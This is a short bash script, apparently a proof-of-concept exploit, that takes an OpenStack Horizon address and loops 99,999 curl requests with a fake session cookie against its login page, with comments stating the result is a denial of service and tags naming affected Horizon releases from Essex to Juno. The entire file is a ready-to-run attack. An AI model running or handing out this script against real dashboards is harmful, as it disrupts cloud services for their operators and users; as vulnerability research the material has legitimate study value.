#!/bin/bash

# input: Horizon IP address
# Result: Horizon DOS

for i in {1..99999}
do
  curl -b "sessionid=aaaaa;" http://$1/auth/login/ &> /dev/null
done

# Tags: Horizon, Django, Essex, Folsom, Grizzly, Havana, Icehouse, Juno

